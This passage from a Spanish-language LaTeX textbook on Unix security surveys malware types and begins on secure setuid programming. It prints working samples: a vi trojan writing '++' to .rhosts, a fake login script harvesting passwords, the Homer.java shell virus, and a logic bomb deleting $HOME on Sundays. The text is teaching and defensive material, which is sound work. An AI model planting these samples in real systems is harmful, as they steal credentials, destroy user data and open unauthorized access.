Este programa reservar\'{\i}a un kilobyte de memoria y a continuaci\'on 
crear\'{\i}a una copia de \'el mismo; el programa original y la copia 
repetir\'{\i}an estas acciones, generando cuatro copias en memoria que 
volver\'{\i}an a hacer lo mismo. As\'{\i}, tras un intervalo de ejecuci\'on, 
el c\'odigo anterior consumir\'{\i}a toda la memoria del sistema, pudiendo 
provocar incluso su parada.\\
\\La mejor forma de prevenir ataques de conejos (o simples errores en los
programas, que hagan que \'estos consuman excesivos recursos) es utilizar las
facilidades que los n\'ucleos de cualquier Unix moderno ofrecen para limitar
los recursos que un determinado proceso o usuario puede llegar a consumir en
nuestro sistema; en la secci\'on tres se repasan algunos de los
par\'ametros necesarios para realizar esta tarea sobre diversos clones del 
sistema Unix.
\subsection{Caballos de Troya}
En el libro VIII de La Odisea de Homero se cuenta la historia de que los 
griegos, tras mucho tiempo de asedio a la ciudad de Troya, decidieron construir
un gran caballo de madera en cuyo interior se escondieron unos cuantos soldados;
el resto del ej\'ercito griego abandon\'o el asedio dejando all\'{\i} el
caballo, y al darse cuenta de que el sitio a su ciudad hab\'{\i}a acabado, los 
troyanos salieron a inspeccionar ese gran caballo de madera. Lo tomaron como
una muestra de su victoria y lo introdujeron tras las murallas de la ciudad sin
darse cuenta de lo que realmente hab\'{\i}a en \'el. Cuando los troyanos
estaban celebrando el fin del asedio, del interior del caballo salieron los
soldados griegos, que abrieron las puertas de la ciudad al resto de su 
ej\'ercito -- que hab\'{\i}a vuelto al lugar -- y pudieron de esta forma 
conquistar la ciudad de Troya.\\
\\De la misma forma que el antiguo caballo de Troya de la mitolog\'{\i}a griega
escond\'{\i}a en su interior algo que los troyanos desconoc\'{\i}an, y que 
ten\'{\i}a una funci\'on muy diferente a la que ellos pensaban, un troyano o 
caballo de Troya actual es un programa que aparentemente realiza una
funci\'on \'util para qui\'en lo ejecuta, pero que en realidad -- o aparte -- 
realiza una funci\'on que el usuario desconoce, generalmente da\~nina. Por
ejemplo, un usuario que posea el suficiente privilegio en el sistema puede 
renombrar el editor {\tt vi} como {\tt vi.old}, y crear un programa denominado
{\tt vi} como el siguiente:
\tt
\begin{quote}
\begin{verbatim}
#!/bin/sh
echo "++">$HOME/.rhosts
vi.old $1
\end{verbatim}
\end{quote}
\rm
Si esto sucede, cuando alguien trate de editar un fichero autom\'aticamente
va a crear un fichero {\tt .rhosts} en su directorio de usuario, que 
permitir\'a a un atacante acceder de una forma sencilla al sistema utilizando
las \'ordenes {\tt r-$\ast$} de Unix BSD.\\
\\Los troyanos son quiz\'as el {\it malware} m\'as difundido en cualquier tipo 
de entorno (\cite{kn:kra}), incluyendo por supuesto a Unix; sus variantes 
incluyen incluso ejemplos graciosos: ha habido casos en
los que comenta un potencial problema de seguridad -- real -- en una lista
de correo y se acompa\~na la descripci\'on de un {\it shellscript} que en
principio aprovecha dicho problema para conseguir privilegios de {\it root}. En 
ese {\it exploit} se ha incluido, convenientemente camuflada, una sentencia 
similar a la siguiente:
\begin{quote}
\begin{verbatim}
echo "A'p gr4ibf t2 hLcM ueem"|tr Ae4Lpbf2gumM Ioyamngotrtk| mail \
     -s "`echo "A'p gr4ibf t2 hLcM ueem"|tr Ae4Lpbf2gumM Ioyamngotrtk`" root
\end{verbatim}
\end{quote}
De esta forma, cuando un {\it script kiddie} ejecute el programa para conseguir
privilegios en el sistema, sin darse cuenta autom\'aticamente lo estar\'a 
notificando al administrador del mismo; evidentemente el {\it exploit} suele
ser falso y no da ning\'un privilegio adicional, simplemente sirve para que el 
{\it root} sepa qu\'e usuarios est\'an `jugando' con la seguridad de sus
m\'aquinas.\\
\\Por desgracia, estos troyanos inofensivos no son los m\'as comunes; existen
tambi\'en ejemplos de caballos de Troya da\~ninos: sin duda el ejemplo 
t\'{\i}pico de troyano (tan t\'{\i}pico que ha recibido un nombre especial:
{\it trojan mule} o mula de Troya (\cite{kn:tom94})) es el falso programa de 
{\it login}. Nada m\'as encender
una terminal de una m\'aquina Unix aparece el cl\'asico mensaje {\tt `login:'}
solicitando nuestro nombre de usuario y contrase\~na, datos que con toda 
seguridad la persona que enciende este dispositivo teclear\'a para poder acceder
al sistema. Pero, >qu\'e suceder\'{\i}a si el programa que imprime 
el mensaje en pantalla es un troyano? Cualquier usuario del sistema puede crear
un c\'odigo que muestre un mensaje similar, guarde la informaci\'on le\'{\i}da
de teclado (el {\it login} y el {\it password}) e invoque despu\'es al programa
{\tt login} original; tras la primera lectura, se mostrar\'a el tambi\'en
cl\'asico mensaje {\it `Login incorrect'}, de forma que el usuario pensar\'a
que ha tecleado mal sus datos -- nada extra\~no, al fin y al cabo --. Cuando
el programa original se ejecute, se permitir\'a el acceso al sistema y ese
usuario no habr\'a notado nada anormal, pero alguien acaba de registrar su
{\it login} y su contrase\~na. Un troyano de este tipo es tan sencillo que se
puede hacer -- de forma simplificada -- en unas pocas l\'{\i}neas de {\it
shellscript}:
\begin{quote}
\begin{verbatim}
luisa:~$ cat trojan
clear
printf "`uname -n` login: "
read login
stty -echonl -echo
printf "Password: "
read pass
echo "$login : $pass" >>/tmp/.claves
printf "\nLogin incorrect"
echo 
exec /bin/login
luisa:~$ 
\end{verbatim}
\end{quote}
El atacante no necesita m\'as que dejar lanzado el programa en varias terminales
del sistema y esperar tranquilamente a que los usuarios vayan tecleando sus
{\it logins} y {\it passwords}, que se guardar\'an en {\tt /tmp/.claves};
evidentemente este ejemplo de troyano es muy simple, pero es suficiente para
hacernos una idea del perjuicio que estos programas pueden producir en una
m\'aquina Unix. En los \'ultimos a\~nos han aparecido caballos de Troya mucho
m\'as elaborados en diversas utilidades de Unix, incluso en aplicaciones 
relacionadas con la seguridad como {\it TCP Wrappers}; en \cite{kn:cert99} se
pueden encontrar referencias a algunos de ellos.\\
\\La forma m\'as f\'acil de descubrir caballos de Troya (aparte de sufrir sus
efectos una vez activado) es comparar los ficheros bajo sospecha con una copia
de los originales, copia que evidentemente se ha de haber efectuado antes de
poner el sistema en funcionamiento y debe haber sido guardada en un lugar 
seguro, para evitar as\'{\i} que el atacante modifique tambi\'en la versi\'on 
de nuestro {\it backup}. Tambi\'en es recomendable -- como sucede con el resto
de {\it malware} -- realizar res\'umenes {\sc md5} de nuestros programas y
compararlos con los res\'umenes originales; esto, que muchas veces es ignorado,
puede ser una excelente soluci\'on para prevenir la amenaza de los caballos de
Troya.
\subsection{Applets hostiles}
En los \'ultimos a\~nos, con la proliferaci\'on de la {\it web}, Java y 
Javascript, una nueva forma de {\it malware} se ha hecho popular. Se trata de
los denominados {\it applets} hostiles, {\it applets} que al ser descargados 
intentan monopolizar o explotar los recursos del sistema de una forma 
inapropiada (\cite{kn:mcg96}); esto incluye desde ataques cl\'asicos como 
negaciones de servicio o ejecuci\'on remota de programas en la m\'aquina 
cliente hasta amenazas mucho m\'as elaboradas, como difusi\'on de virus,
ruptura l\'ogica de cortafuegos o utilizaci\'on de recursos remotos para grandes
c\'alculos cient\'{\i}ficos.\\
\\Como ejemplo de {\it applet} hostil -- aunque este en concreto no es muy 
peligroso -- tenemos el siguiente c\'odigo, obra de Mark D. LaDue (1996):
\begin{quote}
\begin{verbatim}
anita:~/Security# cat Homer.java
import java.io.*;

class Homer {
    public static void main (String[] argv) {
    try {
        String userHome = System.getProperty("user.home");
        String target = "$HOME";
        FileOutputStream outer = new 
                 FileOutputStream(userHome + "/.homer.sh");
        String homer = "#!/bin/sh" + "\n" + "#-_" + "\n" +
        "echo \"Java is safe, and UNIX viruses do not exist.\"" + "\n" +
        "for file in `find " + target + " -type f -print`" + "\n" + "do" +
        "\n" + "    case \"`sed 1q $file`\" in" + "\n" +
        "        \"#!/bin/sh\" ) grep '#-_' $file > /dev/null" +
        " || sed -n '/#-_/,$p' $0 >> $file" + "\n" +
        "    esac" + "\n" + "done" + "\n" + 
        "2>/dev/null";
        byte[] buffer = new byte[homer.length()];
        homer.getBytes(0, homer.length(), buffer, 0);
        outer.write(buffer);
        outer.close();
        Process chmod = Runtime.getRuntime().exec("/usr/bin/chmod 777 " +
                        userHome + "/.homer.sh");
        Process exec = Runtime.getRuntime().exec("/bin/sh " + userHome +
                       "/.homer.sh");
        } catch (IOException ioe) {}
    }
}
anita:~/Security#
\end{verbatim}
\end{quote}
Este programa infecta los sistemas Unix con un virus que contamina ficheros
{\it shellscript}; antes de hacerlo muestra el mensaje {\it `Java is safe, and 
UNIX viruses do not exist'}, para despu\'es localizar todos los ficheros {\it
shell} en el directorio {\it \$HOME}, comprobar cu\'ales est\'an infectados, e
infectar los que no lo est\'an.\\
\\Aunque en un principio no se tom\'o muy en serio el problema de los {\it
applets} hostiles, poco tiempo despu\'es la propia {\it Sun Microsystems} 
reconoci\'o la problem\'atica asociada y se puso a trabajar para minimizar los
potenciales efectos de estos {\it applets}; principalmente se han centrado 
esfuerzos en controlar la cantidad de recursos consumidos por un programa y en
proporcionar las clases necesarias para que los propios navegadores monitoricen
los {\it applets} ejecutados. No obstante, aunque se solucionen los problemas
de seguridad en el c\'odigo, es probable que se puedan seguir utilizando {\it
applets} como una forma de ataque a los sistemas: mientras que estos programas
puedan realizar conexiones por red, no habr\'an desaparecido los problemas.
\subsection{Bombas l\'ogicas}
Las bombas l\'ogicas son en cierta forma similares a los troyanos: se trata de
c\'odigo insertado en programas que parecen realizar cierta acci\'on \'util. 
Pero mientras que un troyano se ejecuta cada vez que se ejecuta el programa que
lo contiene, una bomba l\'ogica s\'olo se activa bajo ciertas condiciones, como
una determinada fecha, la existencia de un fichero con un nombre dado, o el 
alcance de cierto n\'umero de ejecuciones del programa que contiene la bomba;
as\'{\i}, una bomba l\'ogica puede permanecer inactiva en el sistema durante 
mucho tiempo sin activarse y por tanto sin que nadie note un funcionamiento
an\'omalo hasta que el da\~no producido por la bomba ya est\'a hecho. Por 
ejemplo, imaginemos la misma situaci\'on que antes ve\'{\i}amos para el troyano:
alguien con el suficiente privilegio renombra a {\tt vi} como {\tt vi.old}, y
en el lugar del editor sit\'ua el siguiente c\'odigo:
\tt
\begin{quote}
\begin{verbatim}
#!/bin/sh
if [ `date +%a` = "Sun" ]; 
    then
        rm -rf $HOME
    else
        vi.old $1
fi
\end{verbatim}
\end{quote}
\rm
Este cambio en el sistema puede permanecer durante a\~nos\footnote{Obviamente,
si esto es as\'{\i}, denota una escasa preocupaci\'on por la seguridad en ese
sistema.} sin que se produzca
un funcionamiento an\'omalo, siempre y cuando nadie edite ficheros un domingo;
pero en el momento en que un usuario decida trabajar este d\'{\i}a, la bomba
l\'ogica se va a activar y el directorio de este usuario ser\'a borrado.
\subsection{Canales ocultos}
Seg\'un \cite{kn:glo} un canal oculto es un cauce de comunicaci\'on que permite
a un proceso receptor y a un emisor intercambiar informaci\'on de forma que
viole la pol\'{\i}tica de seguridad del sistema; esencialmente se trata de un
m\'etodo de comunicaci\'on que no es parte del dise\~no original del sistema 
pero que puede utilizarse para transferir informaci\'on a un proceso o usuario
que {\it a priori} no estar\'{\i}a autorizado a acceder a dicha informaci\'on. 
Los canales ocultos existen s\'olamente en sistemas con seguridad multinivel
(\cite{kn:pro92}), aquellos que contienen y manejan informaci\'on con
diferentes niveles de sensibilidad, de forma que se permite acceder 
simult\'aneamente a varios usuarios a dicha informaci\'on pero con diferentes 
puntos de vista de la misma, en funci\'on de sus privilegios y sus necesidades 
de conocimiento ({\it needs to know}). El concepto de canal oculto
fu\'e introducido en 1973, en \cite{kn:lam73}, y desde entonces muchos han 
sido los estudios realizados sobre este m\'etodo de ataque, que afecta 
especialmente a sistemas en los que el aspecto m\'as importante de la seguridad
es la privacidad de los datos (por ejemplo, los militares).\\
\\Generalmente se suelen clasificar los canales cubiertos en funci\'on de 
varios aspectos (\cite{kn:gli93}):
\begin{itemize}	
\item Escenario\\
Cuando se construyen escenarios de canales cubiertos generalmente se suele
diferenciar entre canales cubiertos {\bf de almacenamiento} y {\bf de 
temporizaci\'on} (\cite{kn:lip75}). Los primeros son canales en los que se 
utiliza la escritura directa o indirecta de datos por parte de un proceso y la 
lectura -- tambi\'en directa o indirecta -- de esos datos por parte de otro;
generalmente utilizan un recurso finito del sistema, como bloques de disco, que
se comparte entre entidades con diferentes privilegios. Por contra, los 
canales ocultos de temporizaci\'on utilizan la modulaci\'on de ciertos recursos,
como el tiempo de CPU, para intercambiar la informaci\'on entre procesos. En
\cite{kn:gli93} se pueden encontrar ejemplos de ambos tipos de canales ocultos;
otro buen ejemplo de {\it covert channel} se encuentra en \cite{kn:mch95}.
\item Ruido\\
Como cualquier canal de comunicaci\'on, oculto o no, los canales cubiertos 
pueden ser ruidosos o inmunes al ruido; idealmente, un canal inmune al ruido es
aqu\'el en que la probabilidad de que el receptor escuche exactamente lo que
el emisor ha transmitido es 1: sin importar factores externos, no hay 
interferencias en la transmisi\'on. Evidentemente, en la pr\'actica es muy
dif\'{\i}cil conseguir estos canales tan perfectos, por lo que es habitual 
aplicar c\'odigos de correcci\'on de errores aunque \'estos reduzcan el ancho
de banda del canal. 
\item Flujos de informaci\'on\\
De la misma forma que en las l\'{\i}neas convencionales de transmisi\'on de 
datos se aplican t\'ecnicas (multiplexaci\'on en el tiempo, multiplexaci\'on en
frecuencia\ldots) para maximizar el ancho de banda efectivo, en los canales
cubiertos se puede hacer algo parecido. A los canales en los que se transmiten
varios flujos de informaci\'on entre emisor y receptor se les denomina {\bf
agregados}, y dependiendo de c\'omo se inicialicen, lean y {\it reseteen} las 
variables enviadas podemos hablar de agregaci\'on serie, paralela o 
h\'{\i}brida; los canales con un \'unico flujo de informaci\'on se llaman 
{\bf no agregados}.
\end{itemize}	
La preocupaci\'on por la presencia de canales ocultos es, como hemos dicho, 
habitual en sistemas de alta seguridad como los militares; de hecho, muchos
de los estudios sobre ataques basados en canales cubiertos y su prevenci\'on 
han sido -- y son -- realizados por las cl\'asicas agencias gubernamentales 
y militares estadounidenses ({\it National Security Agency}, {\it US Air Force},
{\it National Computer Security Center}\ldots). No obstante, tambi\'en en
entornos m\'as `normales' es posible la existencia de canales ocultos, 
especialmente aprovechando debilidades de la pila de protocolos TCP/IP 
(\cite{kn:dae96}, \cite{kn:row96}\ldots).\\
\\El an\'alisis y detecci\'on canales cubiertos es una tarea complicada que
generalmente se basa en complejos modelos formales y matem\'aticos 
(\cite{kn:wra91a}, \cite{kn:mos94}\ldots); diversas aproximaciones son 
utilizadas para el estudio de 
canales de temporizaci\'on (\cite{kn:hu91}, \cite{kn:wra91b}\ldots), y tambi\'en
para el de canales de almacenamiento (\cite{kn:por91}).
\subsection{Puertas traseras}
Las puertas traseras son trozos de c\'odigo en un programa que permiten a 
qui\'en conoce su funcionamiento saltarse los m\'etodos usuales de 
autenticaci\'on para realizar cierta tarea. Habitualmente son insertados por
los programadores para agilizar la tarea de probar su c\'odigo durante la
fase de desarrollo del mismo y se eliminan en el producto final, pero en 
ciertas situaciones el programador puede mantener estas puertas traseras en el
programa funcional, ya sea deliberada o involuntariamente. Por ejemplo, 
imaginemos una aplicaci\'on que para realizar cualquier tarea de seguridad 
solicita a quien lo ejecuta cinco claves diferentes; evidentemente, durante 
la fase de desarrollo es muy inc\'omodo para el programador teclear estas 
contrase\~nas antes de ver si el producto funciona correctamente, por lo que
es muy com\'un que esta persona decida incluir una rutina en el c\'odigo de
forma que si la primera clave proporcionada es una determinada no se soliciten
las cuatro restantes. Esta situaci\'on, aceptable durante la fase de desarrollo,
se convierte en una amenaza a la seguridad si se mantiene una vez el producto
est\'a instalado en un sistema {\it real}: cualquiera que conozca la clave
inicial puede saltarse todo el mecanismo de protecci\'on del programa.\\
\\Aparte de puertas traseras en los programas, es posible -- y t\'{\i}pico -- 
situar puertas traseras en ciertos ficheros vitales para el sistema; 
generalmente, cuando un atacante consigue acceso a una m\'aquina Unix desea 
mantener ese acceso aunque su penetraci\'on sea detectada. Por ejemplo, algo 
muy habitual es a\~nadir un usuario con UID 0 en el fichero de claves, de forma
que el pirata pueda seguir accediendo al sistema con ese nuevo {\it login}
aunque el administrador cierre la puerta que antes hab\'{\i}a utilizado para 
entrar. Tambi\'en es cl\'asico a\~nadir un nuevo servicio en un puerto no 
utilizado, de forma que haciendo {\it telnet} a ese n\'umero de puerto se
abra un {\it shell} con privilegios de {\it root}; incluso muchos atacantes
utilizan la facilidad {\tt cron} para chequear peri\'odicamente estos archivos
e insertar las puertas traseras de nuevo en caso de que hayan sido borradas.
>Qu\'e hacer para evitar estos ataques? La prevenci\'on pasa por comprobar
peri\'odicamente la integridad de los archivos m\'as importantes (ficheros de
contrase\~nas, {\it spoolers}, configuraci\'on de la red, programas del arranque
de m\'aquina\ldots); tambi\'en es conveniente rastrear la existencia de nuevos
archivos {\it setuidados} que puedan `aparecer' en los sistemas de ficheros:
cualquier nuevo programa de estas caracter\'{\i}sticas suele indicar un ataque
exitoso, y una puerta trasera -- generalmente un {\it shell} setuidado -- 
colocada en nuestra m\'aquina. Los m\'as paranoicos no deben olvidar efectuar
una b\'usqueda bajo los dispositivos montados (existen utilidades para hacerlo),
ya que un {\tt find} normal no suele encontrar ficheros {\it setuidados} que se 
guarden en un directorio que es a su vez punto de montaje para otra unidad.
\subsection{Superzapping}
Este problema de seguridad deriva su nombre del programa {\tt superzap}, una
utilidad de los antiguos {\it mainframes} de IBM que permit\'{\i}a a qui\'en
lo ejecutaba pasar por alto todos los controles de seguridad para realizar
cierta tarea administrativa, presumiblemente urgente; se trataba de un {\it 
`Rompa el cristal en caso de emergencia'} que estos sistemas pose\'{\i}an, o 
de una llave maestra capaz de abrir todas las puertas. Obviamente, el problema
sucede cuando la llave se pierde y un atacante la utiliza en beneficio propio.\\
\\Como es normal, este tipo de programas no suele encontrarse en los sistemas 
modernos por los graves problemas de seguridad que su existencia implica: 
imaginemos un {\it shell} setuidado como {\it root} y guardado en {\tt /tmp/},
de forma que si el sistema funciona an\'omalamente cualquiera puede ejecutarlo
para solucionar el posible problema. Parece obvio que para un atacante 
ser\'{\i}a un gran avance disponer de esta herramienta. De cualquier forma, no
es habitual clasificar a los programas {\it superzap} como {\it malware}, ya
que en principio se trata de aplicaciones leg\'{\i}timas, incluso necesarias
en determinadas situaciones; es, como sucede en muchos casos, su mal uso y no
el programa en s\'{\i} lo que constituye una amenaza a la seguridad.\\
\\El ejemplo t\'{\i}pico (\cite{kn:isv95}, \cite{kn:par81}\ldots) de problemas 
derivados del {\it superzapping} es un
caso ocurrido en Nueva Jersey que caus\'o la p\'erdida de 128.000 d\'olares de
los a\~nos setenta. El operador de un sistema bancario estaba utilizando un
programa {\it superzap} para corregir balances en el estado de las cuentas 
cuando un error simple le demostr\'o lo f\'acil que pod\'{\i}a modificar 
registros sin que el sistema de auditor\'{\i}a lo detectara; aprovech\'o esta
situaci\'on para transferir dinero a tres cuentas, y dado que no dej\'o huellas
la \'unica forma de detectar el fraude fu\'e la r\'apida reacci\'on del banco
ante la queja de un usuario -- y un exhaustivo an\'alisis del estado de todas 
las cuentas.
\subsection{Programas salami}
Las t\'ecnicas salami se utilizan para desviar peque\~nas cantidades de 
bienes -- generalmente dinero -- de una fuente con un gran cantidad de los 
mismos; de la misma forma que de un salami se cortan peque\~nas rodajas sin que
el total sufra una reducci\'on considerable, un programa salami roba peque\~nas
cantidades de dinero, de forma que su acci\'on pasa inadvertida. Aunque su 
efecto es especialmente
grave en entornos bancarios y no en sistemas habituales, en este trabajo vamos a
hablar brevemente de los programas salami ya que se pueden utilizar para atacar
equipos Unix dedicados a operaciones financieras, como la gesti\'on de n\'ominas
de personal o la asignaci\'on de becas.\\
\\El principal problema de los programas salami es que son extremadamente 
dif\'{\i}ciles de detectar, y s\'olo una compleja auditor\'{\i}a de cuentas
puede sacar a la luz estos fraudes. Si un programador es lo suficientemente
inteligente como para insertar {\it malware} de este tipo en los sistemas de
un banco para el cual trabaja (si se tratara de un atacante externo la 
probabilidad de ataque ser\'{\i}a casi despreciable), seguramente conoce a la
perfecci\'on todos los entresijos de dicho banco, de forma que no le ser\'a
dif\'{\i}cil desviar fondos a cuentas que no son la suya, comprobar si se 
sobrepasa un cierto umbral en dichas cuentas -- umbral a partir del cual el
banco `se interesar\'{\i}a' por el propietario de la cuenta -- o incluso 
utilizar nombres falsos o cuentas externas a las que desviar el dinero. Contra
esto, una de las pocas soluciones consiste en vigilar de cerca las cuentas de
los empleados y sus allegados, as\'{\i} como estar atentos a posibles cambios 
en su modo de vida: un coche de lujo de una persona con un sueldo normal, 
viajes caros, demasiadas ostentaciones\ldots pueden ser signo de un fraude;
evidentemente, es necesario consultar con un gabinete jur\'{\i}dico la 
legalidad o ilegalidad de estas acciones, que pueden constituir una invasi\'on
a la privacidad del trabajador. Por supuesto, la soluci\'on ideal ser\'{\i}a 
comprobar l\'{\i}nea a l\'{\i}nea todo el {\it software} del banco, pero pocos 
auditores tienen los conocimientos -- y la paciencia -- suficientes para 
realizar esta tarea.\\
\\Un caso particular de programa salami lo constituyen los programas de redondeo
hacia abajo o {\it round down}. Este fraude consiste en aprovechar c\'alculos
de los sistemas bancarios que obtienen cantidades de dinero m\'as peque\~nas que
la moneda de menor valor (en el caso de Espa\~na, cantidades de c\'entimos);
por ejemplo, imaginemos que alguien tiene ingresadas 123.523 pesetas a un
inter\'es del 2'5\%; los cr\'editos le reditar\'an un total de 3088'075 pesetas,
que autom\'aticamente para el banco se transformar\'an en 3088. Si esos 7'5
c\'entimos se acumulan en otro c\'alculo con cantidades igual de despreciables,
se llegar\'a tarde o temprano a un punto en el que la cantidad total de dinero
sea lo suficientemente apetecible para un atacante dispuesto a aprovechar la
situaci\'on. Si pensamos que millones de estos c\'alculos se realizan 
diariamente en todos los bancos de Espa\~na, podemos hacernos una idea del poco 
tiempo que tardar\'a la cuenta de un pirata en llenarse.
\section{Programaci\'on segura}
\label{progseg}
Parece obvio que despu\'es de analizar los problemas que un c\'odigo malicioso
o simplemente mal dise\~nado puede causar, dediquemos un apartado a comentar
brevemente algunos aspectos a tener en cuenta a la hora de crear programas
seguros. Vamos a hablar de programaci\'on en C, obviamente por ser el lenguaje
m\'as utilizado en Unix; para aquellos interesados en la seguridad de otros
lenguajes que tambi\'en se utilizan en entornos Unix, existen
numerosos art\'{\i}culos que hablan de la programaci\'on segura -- e insegura 
-- en lenguajes que van desde Java (\cite{kn:meh98}, \cite{kn:dea96}, 
\cite{kn:gal96a}\ldots) a SQL (\cite{kn:pol93}).\\
\\El principal problema de la programaci\'on en Unix lo constituyen los 
programas {\it setuidados}; si un programa sin este bit activo tiene un fallo,
lo normal es que ese fallo solamente afecte a quien lo ejecuta. Al tratarse
de un error de programaci\'on, algo no intencionado, su primera consecuencia
ser\'a el mal funcionamiento de ese programa. Este esquema cambia radicalmente
cuando el programa est\'a {\it setuidado}: en este caso, el error puede 
comprometer tanto a quien lo ejecuta como a su propietario, y como ese 
propietario es por norma general el {\it root} autom\'aticamente se compromete 
a todo el sistema. Para la codificaci\'on segura de este tipo de programas,
\cite{kn:bis86} proporciona unas l\'{\i}neas b\'asicas:
\begin{itemize}
\item M\'aximas restricciones a la hora de elegir el UID y el GID.\\
Una medida de seguridad b\'asica que todo administrador de sistemas Unix ha
de seguir es realizar todas las tareas con el m\'{\i}nimo privilegio que estas
requieran (\cite{kn:sim90}); as\'{\i}, a nadie se le ocurre (o se le 
deber\'{\i}a ocurrir) 
conectar a IRC o aprender a manejar una aplicaci\'on gen\'erica bajo la 
identidad de {\it root}.  Esto es directamente aplicable a la hora de programar:
cuando se crea un programa {\it setuidado} (o {\it setgidado}) se le ha de
asignar tanto el UID como el GID menos peligroso para el sistema. Por ejemplo,
si un programa servidor se limita a mostrar un mensaje en pantalla y adem\'as 
escucha en un puerto por encima de 1024, no necesita para nada estar {\it
setuidado} a nombre de {\it root} (realmente, es poco probable que ni siquiera
necesite estar {\it setuidado}); si pensamos en un posible error en dicho 
programa que permita a un atacante obtener un {\it shell} vemos claramente
que cuanto menos privilegio tenga el proceso, menos malas ser\'an las posibles
consecuencias de tal error.
\item {\it Reset} de los UIDs y GIDs efectivos antes de llamar a {\tt exec()}.\\
Uno de los grandes problemas de los programas {\it setuidados} es la 
ejecuci\'on de otros programas de manera inesperada; por ejemplo, si el usuario
introduce ciertos datos desde teclado, datos que se han de pasar como argumento
a otra aplicaci\'on, nada nos asegura {\it a priori} que esos datos sean 
correctos o coherentes. Por tanto, parece obvio resetear el UID y el GID 
efectivos antes de invocar a {\tt exec()}, de forma que cualquier ejecuci\'on
inesperada se realice con el m\'{\i}nimo privilegio necesario; esto tambi\'en
es aplicable a funciones que indirectamente realicen el {\tt exec()}, como
{\tt system()} o {\tt popen()}.
\item Es necesario cerrar todos los descriptores de fichero, excepto los 
estrictamente necesarios, antes de llamar a {\tt exec()}.\\
Los descriptores de ficheros son un par\'ametro que los procesos Unix heredan
de sus padres; de esta forma, si un programa {\it setuidado} est\'a leyendo
un archivo, cualquier proceso hijo tendr\'a acceso a ese archivo a no ser que
expl\'{\i}citamente se cierre su descriptor antes de ejecutar el {\tt exec()}.\\
\\La forma m\'as f\'acil de prevenir este problema es activando un {\it flag}
que indique al sistema que ha de cerrar cierto descriptor cada vez que se 
invoque a {\tt exec()}; esto se consigue mediante las llamadas {\tt fcntl()}
e {\tt ioctl()}.
\item Hay que asegurarse de que {\tt chroot()} realmente restringe.\\
Los enlaces duros entre directorios son algo que el n\'ucleo de muchos sistemas
Unix no permiten debido a que genera bucles en el sistema de ficheros, algo
que crea problemas a determinadas aplicaciones; por ejemplo, Linux no permite
crear estos enlaces, pero Solaris o Minix s\'{\i}. En estos \'ultimos, en los
clones de Unix que permiten {\it hard links} entre directorios, la llamada
{\tt chroot()} puede perder su funcionalidad: estos enlaces pueden seguirse
aunque no se limiten al entorno con el directorio ra\'{\i}z restringido. Es
necesario asegurarse de que no hay directorios enlazados a ninguno de los 
contenidos en el entorno {\tt chroot()} (podemos verlo con la opci\'on {\tt 
`-l'} de la orden {\tt ls}, que muestra el n\'umero de enlaces de cada 
archivo).
\item Comprobaciones del entorno en que se ejecutar\'a el programa.\\
En Unix todo proceso hereda una serie de variables de sus 
progenitores, como el {\tt umask}, los descriptores de ficheros, o ciertas 
variables de entorno ({\it \$PATH}, {\it \$IFS}\ldots); para una ejecuci\'on 
segura, es necesario controlar todos y cada uno de estos elementos que afectan 
al entorno de un proceso. Especialmente cr\'{\i}ticas son las funciones que
dependen del {\it shell} para ejecutar un programa, como {\tt system()} o {\tt
execvp()}: en estos casos es muy dif\'{\i}cil asegurar que el {\it shell} va
a ejecutar la tarea prevista y no otra. Por ejemplo, imaginemos el siguiente
c\'odigo:
\begin{quote}
\begin{verbatim}
#include <stdlib.h>

main(){
  system("ls");
}
\end{verbatim}
\end{quote}
A primera vista, este programa se va a limitar a mostrar un listado del
directorio actual; no obstante, si un usuario modifica su {\it \$PATH} de forma
que el directorio {\tt `.'} ocupe el primer lugar, se ejecutar\'a {\tt ./ls}
en lugar de {\tt /bin/ls}. Si el programa {\tt ./ls} fuera una copia del {\it 
shell}, y el c\'odigo anterior estuviera setuidado por el {\it root}, cualquier 
usuario podr\'{\i}a obtener privilegios de administrador.\\
\\Quiz\'as alguien puede pensar que el problema se soluciona si se indica la
ruta completa ({\tt /bin/ls}) en lugar de \'unicamente el nombre del ejecutable;
evidentemente, esto arreglar\'{\i}a el fallo anterior, pero seguir\'{\i}an
siendo factibles multitud de ataques contra el programa. Desde la modificaci\'on
del {\it \$IFS} (como veremos m\'as adelante) hasta la ejecuci\'on en entornos 
restringidos, existen 
much\'{\i}simas t\'ecnicas que hacen muy dif\'{\i}cil que un programa con estas 
caracter\'{\i}sticas pueda ser considerado seguro.
\item {\bf Nunca} {\it setuidar} {\it shellscripts}.\\
Aunque en muchos sistemas Unix la activaci\'on del bit {\it setuid} en {\it 
shellscripts} no tiene ning\'un efecto, muchos otros a\'un permiten que los
usuarios -- especialmente el {\it root} -- creen procesos interpretados y {\it
setuidados}. La potencia de los int\'erpretes de \'ordenes de Unix hace casi
imposible controlar que estos programas no realicen acciones no deseadas, 
violando la seguridad del sistema, por lo que bajo ning\'un concepto se ha de
utilizar un proceso por lotes para realizar acciones privilegiadas de forma
{\it setuidada}.
\item No utilizar {\tt creat()} para bloquear.\\
Una forma de crear un fichero de bloqueo es invocar a {\tt creat()} con un
modo que no permita la escritura del archivo (habitualmente el 000), de forma 
que si otro usuario tratara de hacer lo mismo, su llamada a {\tt creat()} 
fallar\'{\i}a. Esta aproximaci\'on, que a primera vista parece completamente
v\'alida, no lo es tanto si la analizamos con detalle: en cualquier sistema
Unix, la protecci\'on que proporcionan los permisos de un fichero s\'olo es
aplicable si quien trata de acceder a \'el no es el {\it root}. Si esto es 
as\'{\i}, es decir, si el UID efectivo del usuario que est\'a accediendo al
archivo es 0, los permisos son ignorados completamente y el acceso est\'a
permitido; de esta forma, el {\it root} puede sobreescribir archivos sin 
que le importen sus bits {\it rwx}, lo que implica que si uno de los procesos
que compiten por el recurso bloqueado est\'a setuidado a nombre del 
administrador, el esquema de bloqueo anterior se viene abajo.\\
\\Para poder bloquear recursos en un programa {\it setuidado} se utiliza la 
llamada
{\tt link()}, ya que si se intenta crear un enlace a un fichero que ya existe
{\tt link()} falla aunque el proceso que lo invoque sea propiedad del {\it 
root} (y aunque el fichero sobre el que se realice no le pertenezca).Tambi\'en 
es posible utilizar la llamada al sistema {\tt flock()} de algunos Unices, 
aunque es menos recomendable por motivos de portabilidad entre clones.
\item Capturar todas las se\~nales.\\ 
Un problema que puede comprometer la seguridad del sistema Unix es el volcado
de la imagen en memoria de un proceso cuando \'este recibe ciertas se\~nales
(el cl\'asico {\it core dump}). Esto puede provocar el volcado de informaci\'on
sensible que el programa estaba leyendo: por ejemplo, en versiones del programa 
{\tt login} de algunos Unices antiguos, se pod\'{\i}a leer parte de {\tt 
